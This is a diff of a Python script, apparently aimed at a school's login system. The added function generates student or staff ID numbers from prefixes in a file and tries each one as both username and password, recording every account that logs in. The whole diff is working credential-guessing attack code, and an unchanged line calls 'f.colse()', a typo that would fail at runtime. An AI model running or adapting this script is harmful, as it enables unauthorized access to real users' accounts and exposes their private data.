@@ -35,7 +35,7 @@ def search():
     global RESULT,RESULTx,tempfile,logfile
     global cheaknum,cheakcnum
     while stunum2 <= MAX_SUB :
-        f = open("result.re", 'a+')
+        f = open("resultS.re", 'a+')
         cheakstemp=0
         cheakctemp=0
         print(stunum2)
@@ -85,13 +85,26 @@ def searchTeacher():
         tnum2 =  tnum2 + 1
     f.colse()
 
+def searchBG(bgFile):
+    f1 = open(bgFile)
+    for line in f1 :
+        f = open("resultB.re", 'a+')
+        num = 1
+        while num < 500:
+            number = ('%s%003d' % (line.strip(), num))
+            session = login3.loginget(number, number)
+            if session != '':
+                f.write(number + '\n')
+                print(number + "OK")
+            num = num + 1
+        f.close()
+    f1.close()
+
+
+
 #search()
-searchTeacher()
+#searchTeacher()
+searchBG('xueyuan')
+
 #session = login3.loginget("201430330133","201430330133")
 #print(session)
-
-
-
-
-
-
